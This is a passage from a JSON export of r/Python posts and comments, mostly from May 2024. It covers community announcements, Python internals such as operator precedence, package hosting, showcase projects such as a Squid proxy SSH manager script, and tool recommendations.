            "content": "Try spyder. It’s already built in"
        },
        {
            "author": "mrpanic7",
            "score": "4",
            "content": "This is awesome I’m definitely going to check it out!"
        }
    ]
},
{
    "post_author": "mehul_gupta1997",
    "post_id": "1cu5476",
    "post_score": "4",
    "post_time": "Friday, May 17, 2024 at 4:25:31 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Auto Data Analysis python packages to know ",
    "media": [
        "https://youtu.be/Z7RgmM4cI2I?si=8GGM50qqlN0lGzry"
    ],
    "post_content": "Check this video tutorial to explore different AutoEDA python packages like pandas-profiling, sweetviz, dataprep,etc which can enable automatic data analysis within minutes without any effort : https://youtu.be/Z7RgmM4cI2I?si=8GGM50qqlN0lGzry",
    "comments": []
},
{
    "post_author": "monorepo",
    "post_id": "1ct1tnh",
    "post_score": "52",
    "post_time": "Thursday, May 16, 2024 at 4:50:48 AM GMT+3",
    "flair_text": "Official Event",
    "post_title": "PyCon US 2024 is here!",
    "media": [],
    "post_content": "Official Event",
    "comments": [
        {
            "author": "ryanstephendavis",
            "score": "3",
            "content": "I'm stoked, getting there tomorrow night as a first timer! 🤓",
            "replies": [
                {
                    "author": "itismillertime89",
                    "score": "3",
                    "content": "Excited for you! This was supposed to be my first year as well but took a financial hit and had to back out of the trip. Already planning for next year though."
                }
            ]
        },
        {
            "author": "LightShadow",
            "score": "3",
            "content": "Online attendance crowd, checking in. o7"
        },
        {
            "author": "jk_code",
            "score": "2",
            "content": "do we have discord or telegram group ? or any other social app where guys are sharing the event snaps etc etc?",
            "replies": [
                {
                    "author": "monorepo",
                    "score": "1",
                    "content": "Really only the pycon-us channel on the Python discord."
                }
            ]
        },
        {
            "author": "Pluto_underthedome",
            "score": "1",
            "content": "Ahhhhhh I wannna go"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cvay3b",
    "post_score": "6",
    "post_time": "Sunday, May 19, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "RAJA_1000",
            "score": "3",
            "content": "I started working on a simple project to parametrize LLM prompts. I've been using the chatGPT API for a language learning application and found I had to fine-tune the prompt again and again to get what I wanted. It was a very messy process and difficult to track and doccument so I created a python package to help out with that: https://pypi.org/project/llm-parametrizer/ It lets you make several API calls concurrently with different parameters. You can export the results as csv or get them as JSON or text. Feel free to comment or collaborate if you are interested."
        },
        {
            "author": "Gokdencircle",
            "score": "1",
            "content": "Still working on neural networks and 3D projection, as i am intrigued by the math in both area's. Just interest/hobby. As a spin-off i am now looking at ways to speed up both, playing with Numba , cython, parallel or multi processing tool kits etc. Numba seems to be senstive about np.arrays if defined within the @jit lines. Any suggestions there?"
        },
        {
            "author": "bezuhoff",
            "score": "1",
            "content": "ECS roguelike. My second attempt at a roguelike, the first one turned into a ball of MUD pretty quick. This time no more yolo coding."
        },
        {
            "author": "Ok-Ride-9324",
            "score": "3",
            "content": "I've been working on a sourdough pizza Oh wait, r/python... Nothing"
        },
        {
            "author": "TraditionalDistrict9",
            "score": "1",
            "content": "Revived IconMatch! https://github.com/NativeSensors/IconMatch/tree/main Not necessary needed to be revived, but I have noticed that project was updated 4years ago and I needed some real-time screen scanning capabilities (taking screenshots and finding icons from the display). So packed it into classes and changed it flavor from functions to Object Oriented \"SDK\". For now I will keep it on my repo, as previous maintainer did not touch that project for so long. Also you can find it on pypi: https://pypi.org/project/IconMatch/ Enjoy!"
        },
        {
            "author": "MohamedElfatih",
            "score": "1",
            "content": "I was re-implementing one of the old projects that I did 5 years ago when I was studying for my bachelor's degree. The project is to develop a program that could solve a popular game called 8-puzzle with the help of search algorithms. When I did this project for the first time all the interaction was through command line. I thought this is so boring, so I re-implemented everything again and this time I used pygame to allow user to interact through the mouse. Here is a link to the project https://github.com/mohammedElfatihSalah/8-Puzzle-Solver feel free to contribute with any idea, and don't forget to put star. Have nice day :)"
        },
        {
            "author": "Nblearchangel",
            "score": "1",
            "content": "I'm in a unique situation where I can simply get a cert and have it applied to the community college I go to for credit. Which direction should I go, Certiport or Pearson VUE?"
        },
        {
            "author": "pp314159",
            "score": "1",
            "content": "I'm working on new IDE for Python - that would be perfect for beginners. It is based on notebooks and have GUI to create code. You can click code in each cell. It is a desktop application. It automatically install and import required packages. You can read more on my website https://mljar.com The application can be downloaded and evaluated for free, but you should buy license (similar business model as Sublime). This week I'm working on a way to display Python notebooks on website, so I will be able to create example notebooks for new users. I know that there are many ways to share notebook as HTML, I even wrote a framework for sharing notebooks as web apps https://runmercury.com, but I would like to make notebooks animated. For example, display cell by cell. What is more, I would like to show GUI for each cell."
        }
    ]
},
{
    "post_author": "madnirua",
    "post_id": "1crsmbe",
    "post_score": "10",
    "post_time": "Tuesday, May 14, 2024 at 4:49:28 PM GMT+3",
    "flair_text": "News",
    "post_title": "Declarative GUI Slint v1.6 released with Design Mode (WYSIWYG) Improvements",
    "media": [
        "https://slint.dev/",
        "https://github.com/slint-ui/slint/",
        "https://slint.dev/blog/slint-1.6-released",
        "https://github.com/slint-ui/slint/tree/master/api/python"
    ],
    "post_content": "https://slint.dev/blog/slint-1.6-released\nSlint is a declarative GUI toolkit to build native user interfaces for desktop and embedded applications. Find more information at https://slint.dev/ or check out the source code at https://github.com/slint-ui/slint.\nEDIT: The Python APIs are currently in alpha. More info -- https://github.com/slint-ui/slint/tree/master/api/python",
    "comments": [
        {
            "author": "determineduncertain",
            "score": "5",
            "content": "This doesn’t have Python bindings it would seem. Why is this here?",
            "replies": [
                {
                    "author": "madnirua",
                    "score": "6",
                    "content": "The Python APIs are currently in alpha https://github.com/slint-ui/slint/tree/master/api/python"
                }
            ]
        }
    ]
},
{
    "post_author": "arnaupv",
    "post_id": "1ct9cqu",
    "post_score": "3",
    "post_time": "Thursday, May 16, 2024 at 1:01:06 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Blat AI generates Python code to do web-scraping (code based on Scrapy framework)",
    "media": [
        "https://www.linkedin.com/in/ACoAABsQysMBHUMg-KGkmYwYry-xIjUsCd0mthw",
        "https://www.linkedin.com/in/ACoAAAucVMgB0cfv21gGto5FWMC_q8iLymtlOSI",
        "https://www.kadoa.com/",
        "https://apify.com/",
        "https://github.com/blat-ai/blat-cli",
        "https://www.blat.ai/",
        "https://www.zyte.com/"
    ],
    "post_content": "Miguel Algorri and Arnau Pont Vílchez here, blat co-founders!\nTarget Audience\nPeople who need to collect public data from the web (pricing, articles, reviews, leads etc).\nWhat does our Project Do?\nAt blat we aim to deliver production-ready web scraping code in minutes (written in Python, Scrapy framework).\nThis is feasible thanks to our Web Scraping AI Agent 🧠. Here our CLI to interact with the Web Scraping AI Agent (github). Too good to be true? Check our video\nComparison\nThere are lots of other tools in the market, like Zyte, Apify, Kadoa. All those are great tools for web scraping purposes. The main difference with our competitors is that we give you the Python code that's ready to use (you host it, you run it). Also, once created, the code does not use AI for parsing HTMLs, so it's more efficient and deterministic.\nWhat are we looking for?\nWe encourage you to register as a alpha testers 💪 if you are willing to have a better and more automated web scraping experience. \nHere our CLI to interact with the Web Scraping AI Agent (github)",
    "comments": []
},
{
    "post_author": "BeerIsTheMindKiller",
    "post_id": "1ctwi8z",
    "post_score": "21",
    "post_time": "Friday, May 17, 2024 at 7:16:40 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Folks who know the internals: Where does operator precedence \"happen\"?",
    "media": [],
    "post_content": "Hey! Messing around with instaviz, cool library, highly recommend. You can visualize a function's bytecode as well as AST and some other stuff.\ni entered this:\ndef f():\n  x = 1 + 2 - 10**2\n  return x\nI was expecting the AST nodes for 1 + 2 - 10**2 to be rearranged somehow, with 10**2 being moved to the left hand of the expression, because exponents get evaluated before addition/subtraction. but no! just looks like this:\n... (more tree up here)\nBinOp\n| \\ \\\nBinOp Sub BinOp\n| \\ \\ / | \\\n1 ADD 2 10 POW 2\nI was assuming operator precedence was implemented as the AST level. Seems no - I would assume that the tree would've had the 10 POW 2 on the left. Does it happen at the control flow graph phase? I can imagine the interpreter itself handles it.\ndanke danke danke danke",
    "comments": [
        {
            "author": "K900_",
            "score": "54",
            "content": "ASTs aren't evaluated from left to right, they're evaluated from leaf to root, and you can see that the hierarchy is correct here."
        },
        {
            "author": "mgedmin",
            "score": "17",
            "content": "Operator precedence is determined during parsing, and is usually implemented by defining the grammar rules in a certain way. For example, a grammar like expr ::= number | expr '+' number | expr '-' number | expr '*' number | expr '/' number | expr '**' number has no precedence, so the operations will be performed in the order they're encountered. Meanwhile expr ::= term | expr '+' term | expr '-' term term ::= factor | term '*' factor | term '/' factor factor ::= number | factor '**' number defines the typical precedence for addition/subtraction, multiplication/division, and exponentiation.",
            "replies": [
                {
                    "author": "larsga",
                    "score": "3",
                    "content": "This is exactly it. I made my own \"programming language\", and I implemented precedence this way. It's also specified this way in the XPath spec. Click on OrExpr and you'll see."
                },
                {
                    "author": "boat-la-fds",
                    "score": "1",
                    "content": "Wouldn't you grammar prevent parsing 2*3+4 ?",
                    "replies": [
                        {
                            "author": "mgedmin",
                            "score": "4",
                            "content": "Dunno, I think you go expr ->    (applying expr ::= expr + term) expr + term ->   (applying expr ::= term) term + term ->   (applying term ::= term * factor) term * factor + term ->   (applying term ::= factor in two places) factor * factor + factor ->   (applying factor ::= number in three places) number * number + number and it works out? But in general this is not a good example of a grammar. (I have vague memories of left-recursive productions being problematic in some way, but my days of writing parsers are long over.)",
                            "replies": [
                                {
                                    "author": "boat-la-fds",
                                    "score": "1",
                                    "content": "I think you're right. Thanks."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "kniy",
            "score": "13",
            "content": "Precedence is about the grouping of the expressions, not about the order of evaluation! If you write a() + b() ** c(), the functions are called in left-to-right order of evaluation: a, b, c. But the values from those three call expressions will be combined according to the operator precedence: a() + (b() ** c()).",
            "replies": [
                {
                    "author": "Conscious-Ball8373",
                    "score": "4",
                    "content": "Yes, I think this is OP's central point of confusion. Precedence isn't done by looking through an expression and doing all the exponents, then doing all the multiiplications and divisions, then doing all the additions and subtractions and so on. The operations are only reordered enough that the order is correct. There's a discussion to be had about reverse Polish notation here but I haven't the time."
                },
                {
                    "author": "BeerIsTheMindKiller",
                    "score": "1",
                    "content": "bingo. amazing answers from everybody, huge thanks, but this was what i was missing."
                }
            ]
        },
        {
            "author": "johndburger",
            "score": "1",
            "content": "Just to emphasize the point of the other comments in a different way - your images show that precedence has already “happened”. There are many different orders of operation that respect operator precedence, the compiler doesn’t have to pick the same one you would if you did the computation by hand."
        }
    ]
},
{
    "post_author": "Slow_Scene_7972",
    "post_id": "1cuqmmh",
    "post_score": "36",
    "post_time": "Saturday, May 18, 2024 at 9:05:12 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Mastering Python: 7 Strategies for Writing Clear, Organized, and Efficient Code",
    "media": [
        "https://www.kdnuggets.com/mastering-python-7-strategies-for-writing-clear-organized-and-efficient-code"
    ],
    "post_content": "Optimize Your Python Workflow: Proven Techniques for Crafting Production-Ready Code\nLink",
    "comments": [
        {
            "author": "JamzTyson",
            "score": "32",
            "content": "Rather than using typing.Union, the documentation recommends using the shorthand form X | Y."
        },
        {
            "author": "riklaunim",
            "score": "24",
            "content": "use meaningful variable names, not \"a\" and \"b\" ;) it's not \"calculate_interest\" function responsibility to validate data. That should be a separate layer and used as needed. If you want a very strict interface then use data classes and accept only matching objects. strategies, dictionaries, moving conditionals up the code. environment variables would likely be used."
        },
        {
            "author": "the-pythonista",
            "score": "20",
            "content": "For your config it would be better to use Pydantic settings or even a dataclass rather than writing a class. And with pydantic settings it’ll load your yaml, parse and validate all in one.",
            "replies": [
                {
                    "author": "BrownJamba30",
                    "score": "6",
                    "content": "I am a heavy FastAPI user so I completely agree with this. Pydantic is a lifesaver especially for config files/validation."
                }
            ]
        },
        {
            "author": "Mithrandir2k16",
            "score": "5",
            "content": "Not a fan of 2., it really clutters the code. Either use a generic decorator to validate types of parameters if you need to do it at runtime, or do strict typechecking with mypy and prevent a commit containing type violations with git pre-commit or your build system. And for 7 you should probably consider pydantic.",
            "replies": [
                {
                    "author": "Tobotimus",
                    "score": "3",
                    "content": "Yeah unfortunately I disagreed so much with this point, that it dissuaded me from reading the rest of the article."
                },
                {
                    "author": "XRaySpex0",
                    "score": "3",
                    "content": "Yep.   “Note, that we use conditional statements for input validation.” (Six, inline; so, 12+ LOC.) Also note that the 2-line calculate_interest function has become freakin’ hideous. It’s no way to greet a reader, making them come in through the boiler room."
                }
            ]
        },
        {
            "author": "JamzTyson",
            "score": "4",
            "content": "This has an error: def make_point_3d(pt): match pt: case (x, y): return Point3d(x, y, 0) case (x, y, z): return Point3d(x, y, z) case Point2d(x, y): return Point3d(x, y, 0) case Point3d(_, _, _): return pt case _: raise TypeError(\"not a point we support\") Should be: def make_point_3d(pt): match pt: case (x, y): return Point3d(x, y, 0) case (x, y, z): return Point3d(x, y, z) case Point2d(x=x, y=y): return Point3d(x, y, 0) case Point3d(_, _, _): return pt case _: raise TypeError(\"not a point we support\") The first version will raise a TypeError."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cszngw",
    "post_score": "5",
    "post_time": "Thursday, May 16, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "NextAbrocoma1038",
            "score": "1",
            "content": "Typical request (I guess): I am an old school DevOps Engineer with very less to nothing experience in coding, not much of scripting experience too. I saw someone posted about Fluent Python book to begin with (in another post). Is it a good place to start or are there other books recommendations can someone provide here?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ctrpwz",
    "post_score": "23",
    "post_time": "Friday, May 17, 2024 at 3:00:50 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "dadadidi",
    "post_id": "hd6l9t",
    "post_score": "2145",
    "post_time": "Sunday, June 21, 2020 at 4:03:00 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "A VS Code extension that displays the values of variables while you type",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "FMlMo0dy",
            "score": "60",
            "content": "What happens if your program does something destructive? E.g. write to a file? Is that also executed?",
            "replies": [
                {
                    "author": "dadadidi",
                    "score": "19",
                    "content": "The extension doesn't allow you to delete folders. So for anything where you want to create or delete folders its not really suited :) But you can stop real-time execution for a code block by adding #$save after it (e.g. for a request or writing to a file)",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "47",
                            "content": "This would be far more useful if it blocked any file write operations by default",
                            "replies": [
                                {
                                    "author": "POTUS",
                                    "score": "39",
                                    "content": "Also network APIs, database queries, anything else that accesses any external assets. I can imagine spamming the shit out of some remote server somewhere.",
                                    "replies": [
                                        {
                                            "author": "[deleted]",
                                            "score": "1",
                                            "content": "Realistically, you could just have it pause on with statements, and that would catch like 75%+ of these cases in well-written pythonic code"
                                        }
                                    ]
                                },
                                {
                                    "author": "FMlMo0dy",
                                    "score": "5",
                                    "content": "I agree"
                                },
                                {
                                    "author": "Almenon",
                                    "score": "1",
                                    "content": "The problem is I'm not sure if there's any cross-platform way to do that. I've looked into it and it might be possible in linux but in windows? I have no idea :( Thankfully over the years I've used AREPL (the project livecode was forked from) I've rarely had to write to a file. When I do want to do something unsafe / slow there's a lot of options I can take: You can turn off real-time mode in favor of on-save/on keybinding, avoiding the whole issue alltogether. You can use a #$end comment to evaluate a block of code when you feel it's safe to do so (see project readme for exact details) AREPL waits for you to stop typing before executing - you can adjust this upwards for extra safety. Currently I have the delay set at 300 milliseconds but I'd love to hear feedback if you think there's a better default. You can use AREPL to prototype the script until you have the results you want, at which point you can close AREPL, add the write to file code, and run via command-line or debugging or whatever tool you wish. You can copy and paste the exact filepath"
                                }
                            ]
                        },
                        {
                            "author": "the_pw_is_in_this_ID",
                            "score": "11",
                            "content": "OP, you should also prevent this extension from interacting with anything outside of the Python environment - no HTTP transactions, no file interactions, no calls through USB bus, nothing. All of these are more than a little bit dangerous."
                        },
                        {
                            "author": "t3hcoolness",
                            "score": "6",
                            "content": "So to prevent something from running, you have to add something after you've typed it and it ran? 🤔"
                        }
                    ]
                }
            ]
        },
        {
            "author": "VepnarNL",
            "score": "159",
            "content": "For what would this be useful? And what about huge projects? Anyway, really cool project!"
        },
        {
            "author": "dadadidi",
            "score": "77",
            "content": "This VS Code extension executes your python code while you are still typing. It also shows you intermediate values, whenever a variable is declared or changed, even within loops. You can get the extension here I'd love to get some feedback from you :) I madethis extension to save time while debugging. Usually you have to step through each line with a debugger or add print statements to analyze a bug. Also you have to run the file again after each small change, to see if your change worked. With the variable display of LiveCode, you immediatly see if there is something wrong and you can fix it."
        },
        {
            "author": "R3HAT1N0",
            "score": "25",
            "content": "So this is Swift Playgrounds for Python. Nice"
        },
        {
            "author": "Pand9",
            "score": "17",
            "content": "I think this is good for interactive sessions. Better than both \"type directly into console\" and \"use reusable jupyter cells\" approaches, at a first sight at least. I would like to have it at work. A great idea, congratulations. Did you derive it from some other IDE? Does Pycharm do something similar?"
        },
        {
            "author": "leo848blume",
            "score": "8",
            "content": "I use AREPL a lot. Is there any difference?"
        },
        {
            "author": "Semicolon2112",
            "score": "5",
            "content": "I absolutely love seeing that Python programmers are adopting VS Code. Love this IDE so much. I love the idea of this extension too, feels like one of the things that's missing from other lightweight IDEs like IDLE/IDLEX. To me, this shows off the potential of that VS Code has as it gets adopted by more and more communities. Well done!"
        },
        {
            "author": "arsewarts1",
            "score": "6",
            "content": "Try spyder. It’s already built in"
        },
        {
            "author": "mrpanic7",
            "score": "4",
            "content": "This is awesome I’m definitely going to check it out!"
        }
    ]
},
{
    "post_author": "chione99",
    "post_id": "1crksf7",
    "post_score": "28",
    "post_time": "Tuesday, May 14, 2024 at 8:41:43 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Implementing your own pypi clone",
    "media": [],
    "post_content": "Hi,\nJust want to know how difficult is it to manage your own pypi clone and how do you recommend to create a seperation between dev and prod systems.",
    "comments": [
        {
            "author": "ManyInterests",
            "score": "38",
            "content": "I mean. You can just deploy your own. The PyPI Warehouse is open source and has a readily-deployable docker image: https://github.com/pypi/warehouse",
            "replies": [
                {
                    "author": "night0x63",
                    "score": "3",
                    "content": "Or you use Nexus containers. It you use Gitlab containers."
                }
            ]
        },
        {
            "author": "broken_cogwheel",
            "score": "4",
            "content": "I use sonatype nexus oss for artifact storage. It operates as a python package repo for local things and a pull-through cache for pypi.org you could create a separate repository for dev package deployment and prod package deployment if you wanted to.",
            "replies": [
                {
                    "author": "dryroast",
                    "score": "1",
                    "content": "Would nexus work for an offline pypi repo? I saw that it was caching and I thought like how do I make sure all packages are pulled as it's not obvious what I'd need before hand.",
                    "replies": [
                        {
                            "author": "broken_cogwheel",
                            "score": "2",
                            "content": "Yes, it would work fine. Nexus has 3 types of pypi repos: locally hosted, remote (that can cache), and repo group. Each repo you create has their own url to access that repo. locally hosted, as expected, just serves the packages there. remote pulls packages from an upstream repository like pypi or whatever group repo, allows you to add multiple repos and pull from them in order--first to resolve succeeds. You may create as many repos of any kind as you like. Sonatype nexus allows you to host other artifactories as well and supports some pretty advanced configurations with a relatively easy to use UI. The open source version lacks a few features but nothing that stops me. You don't have to use it but giving it a try is pretty easy to see if it works for your situation."
                        }
                    ]
                }
            ]
        },
        {
            "author": "ivosaurus",
            "score": "2",
            "content": "https://devpi.net/"
        },
        {
            "author": "jsabater76",
            "score": "2",
            "content": "I am not sure whether this is what the OP wants, but I think he might be interested in hosting a local mirror of PyPi but including only the packages used by his or her apps, say in a VM or LXC in his or her cluster, or similar. Should this be the case, what would the options be? DevPi?"
        },
        {
            "author": "ekhazan",
            "score": "2",
            "content": "It can range from something very simple to very complicated and DevOps intensive. It really depends on the scale and expected usage. You can read more about the options here: https://packaging.python.org/en/latest/guides/hosting-your-own-index/ I'll note that from my personal experience setting up a private server for a medium company, having a general artifactory that supports pip protocol is a better way to go. Regarding dev and prod, it's considered good practice to separate but there are multiple ways to do it and really depends on how you plan to build the CI/CD around it. I don't use separate repositories rather rely on the package semver to indicate dev packages at various stages.",
            "replies": [
                {
                    "author": "chione99",
                    "score": "1",
                    "content": "Cool seems this might work for me let me come back once i dig deep."
                }
            ]
        },
        {
            "author": "chub79",
            "score": "1",
            "content": "If you don't mind public clouds, Google Cloud has managed Pypi support and it works well. The only downside is that it's a bit of a pain to associate your DNS to their internal ones. So it's essentially better for private repositories.",
            "replies": [
                {
                    "author": "LightShadow",
                    "score": "2",
                    "content": "GitLab also has package manager support, we're using pypi and npm."
                }
            ]
        },
        {
            "author": "banana33noneleta",
            "score": "1",
            "content": "I'd use packages from the distribution, so they are tied to the version of the distribution and that's it."
        }
    ]
},
{
    "post_author": "abdirxhmxn",
    "post_id": "1cv041z",
    "post_score": "2",
    "post_time": "Saturday, May 18, 2024 at 6:42:31 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Enhanced EPUB Version of \"An Understated Dominance\" Available for Fans!",
    "media": [
        "https://github.com/saturnthehustler/chapterverse-scraper.git",
        "https://drive.google.com/file/d/142IZ2lmqqJn0z6yEv3WD_-tpisLVCMeI/view?usp=sharing"
    ],
    "post_content": "Hey everyone!\nI recently completed a fun project that I think fans of \"An Understated Dominance\" will appreciate, especially those who have struggled with reading the novel online due to website clutter and distractions.\nI've created a clean, distraction-free EPUB version of the novel that you can download and read on your preferred device. You can get it here: EPUB Download.\nWhy I did this: The original website hosting the novel has a lot of distractions that can take away from the reading experience. My goal was to provide a seamless reading experience that allows you to fully immerse yourself in the story without unnecessary interruptions.\nProject Details: For those interested in the technical side, here's a brief overview of how I created the EPUB:\nWeb Scraping: I used Python with libraries like requests and BeautifulSoup to scrape all 2240 chapters of the novel.\nConcurrency: Leveraged concurrent.futures to speed up the scraping process.\nRetries: Implemented retry logic with tenacity to handle any request failures.\nEPUB Creation: Used ebooklib to compile the scraped content into an EPUB file, complete with chapter headers and a cover image.\nYou can check out the full code for this project on my GitHub: GitHub Repository.\nFeedback & Collaboration: I’d love to hear your thoughts on the EPUB. Feel free to download, read, and let me know if you encounter any issues or have suggestions for improvements. If you're interested in collaborating on similar projects or have any ideas, I'm all ears!\nEnjoy the novel, and happy reading!",
    "comments": []
},
{
    "post_author": "SAV_NC",
    "post_id": "1crzgrr",
    "post_score": "2",
    "post_time": "Tuesday, May 14, 2024 at 9:33:25 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Manage Your Squid Proxy Server Efficiently with This Python Script",
    "media": [
        "https://github.com/slyfox1186/script-repo/blob/main/Python3/Networking/squid_proxy_manager.py"
    ],
    "post_content": "🦑 Squid Proxy Manager Script\nHello fellow Python enthusiasts!\nI've created a Python script that makes managing your Squid Proxy Server a breeze. If you're looking for an efficient and straightforward way to interact with your Squid server remotely, this script is for you. 🎉\nWhat My Project Does\nThe Squid Proxy Manager script allows you to manage your Squid Proxy Server remotely using a simple command-line interface. Here are some of the key features:\nCheck Squid Service Status: Quickly check if your Squid service is running or not.\nStart/Stop/Restart Service: Easily control the Squid service remotely.\nView Logs: Access the latest entries in your Squid access logs.\nView Configuration: Display the current Squid configuration file.\nUpdate Configuration: Replace the existing Squid configuration with a new one.\nReload Service: Reload the Squid service to apply changes without restarting.\nTarget Audience\nThis script is designed for anyone who manages a Squid Proxy Server and prefers a command-line tool for remote management. If you are comfortable using Python and SSH, this tool will streamline your workflow and enhance your productivity.\nDifferences\nHere are some aspects that make this Squid Proxy Manager script stand out:\nRemote Management: Manage your Squid server without needing physical access, thanks to SSH connectivity.\nEase of Use: The script provides a simple and intuitive command-line interface, making it easy to perform various tasks.\nComprehensive Features: From checking service status to updating configurations and viewing logs, this script covers all essential Squid management tasks.\nError Handling and Logging: Detailed logging and error handling ensure you know exactly what's happening and can troubleshoot issues effectively.\n🚀 Usage\nInstallation:\nEnsure you have the required libraries installed:\npip install paramiko termcolor\nRunning the Script:\nUse the script with appropriate arguments to manage your Squid Proxy Server. Here's an example command to check the Squid service status:\n./squid_proxy_manager.py 192.168.2.111 22 username password --check-status\nUpdating Configuration:\nCreate a new configuration file (e.g., new_squid.conf) with your desired settings.\nRun the script to update the Squid configuration:\n./squid_proxy_manager.py 192.168.2.111 22 username password --update-config new_squid.conf\n💻 Script Example\nHere's a snippet of the script to give you an idea of its simplicity and functionality:\n#!/usr/bin/env python3\n\nimport paramiko\nimport argparse\nimport logging\nimport sys\nimport os\nfrom termcolor import colored\n\nclass SquidProxyManager:\n    def __init__(self, hostname, port, username, password):\n        self.hostname = hostname\n        self.port = port\n        self.username = username\n        self.password = password\n        self.client = paramiko.SSHClient()\n        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\n    def connect(self):\n        try:\n            logging.info(colored(\"Attempting to connect to {}:{}\".format(self.hostname, self.port), 'cyan'))\n            self.client.connect(self.hostname, port=self.port, username=self.username, password=self.password)\n            logging.info(colored(f\"Connected to {self.hostname} on port {self.port}\", 'green'))\n        except Exception as e:\n            logging.error(colored(f\"Failed to connect: {e}\", 'red'))\n            sys.exit(1)\n\n    def disconnect(self):\n        self.client.close()\n        logging.info(colored(\"Disconnected from the server\", 'green'))\n\n    def execute_command(self, command):\n        logging.info(colored(\"Executing command: {}\".format(command), 'cyan'))\n        try:\n            stdin, stdout, stderr = self.client.exec_command(command)\n            stdout.channel.recv_exit_status()\n            out = stdout.read().decode()\n            err = stderr.read().decode()\n            if err:\n                logging.error(colored(f\"Error executing command '{command}': {err}\", 'red'))\n            else:\n                logging.info(colored(f\"Successfully executed command '{command}'\", 'green'))\n            return out, err\n        except Exception as e:\n            logging.error(colored(f\"Exception during command execution '{command}': {e}\", 'red'))\n            return \"\", str(e)\n\n    # More functions here...\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description=\"Squid Proxy Manager\")\n    parser.add_argument('hostname', help=\"IP address of the Squid proxy server\")\n    parser.add_argument('port', type=int, help=\"Port number for SSH connection\")\n    parser.add_argument('username', help=\"SSH username\")\n    parser.add_argument('password', help=\"SSH password\")\n    parser.add_argument('--check-status', action='store_true', help=\"Check Squid service status\")\n    parser.add.add_argument('--start', action='store_true', help=\"Start Squid service\")\n    parser.add.add_argument('--stop', action='store_true', help=\"Stop Squid service\")\n    parser.add.add_argument('--restart', action='store_true', help=\"Restart Squid service\")\n    parser.add.add_argument('--view-logs', action='store_true', help=\"View Squid logs\")\n    parser.add.add_argument('--view-config', action='store_true', help=\"View Squid configuration\")\n    parser.add.add_argument('--update-config', help=\"Update Squid configuration with provided data\")\n    parser.add.add_argument('--reload', action='store_true', help=\"Reload Squid service\")\n    return parser.parse_args()\n\ndef main():\n    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n    args = parse_args()\n    logging.info(colored(\"Initializing Squid Proxy Manager script\", 'cyan'))\n\n    manager = SquidProxyManager(args.hostname, args.port, args.username, args.password)\n    manager.connect()\n\n    try:\n        if args.check_status:\n            manager.check_squid_status()\n        if args.start:\n            manager.start_squid()\n        if args.stop:\n            manager.stop_squid()\n        if args.restart:\n            manager.restart_squid()\n        if args.view_logs:\n            manager.view_squid_logs()\n        if args.view_config:\n            manager.view_squid_config()\n        if args.update_config:\n            if not args.update_config.endswith('.conf'):\n                logging.error(colored(\"The provided file must have a .conf extension\", 'red'))\n            elif not os.path.isfile(args.update_config):\n                logging.error(colored(f\"Configuration file {args.update_config} not found\", 'red'))\n            else:\n                try:\n                    with open(args.update_config, 'r') as config_file:\n                        config_data = config_file.read()\n                    manager.update_squid_config(config_data)\n                except Exception as e:\n                    logging.error(colored(f\"Error reading configuration file {args.update_config}: {e}\", 'red'))\n        if args.reload:\n            manager.reload_squid()\n    finally:\n        manager.disconnect()\n        logging.info(colored(\"Squid Proxy Manager operations completed\", 'green'))\n\nif __name__ == \"__main__\":\n    main()\n🌟 Benefits\nRemote Management: No need to be physically present to manage your Squid server.\nEase of Use: Simple command-line interface for quick operations.\nVersatility: Supports various Squid management tasks, from checking status to updating configurations and viewing logs.\n📢 Get Involved!\nIf you find this script useful, feel free to give it a try and share your feedback. Contributions and suggestions are always welcome! Comments however, that are unhelpful and serve no purpose to better the script or the author in their python scripting abilities are not welcome! Keep the nasty to yourself.\nAccess the script\nYou can find the script here on GitHub.\nHappy coding! 🚀",
    "comments": []
},
{
    "post_author": "yakimka",
    "post_id": "1cuz4kw",
    "post_score": "1",
    "post_time": "Saturday, May 18, 2024 at 5:57:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Picodi - Simplifying Dependency Injection in Python",
    "media": [
        "https://github.com/yakimka/picodi",
        "https://en.wikipedia.org/wiki/Dependency_injection"
    ],
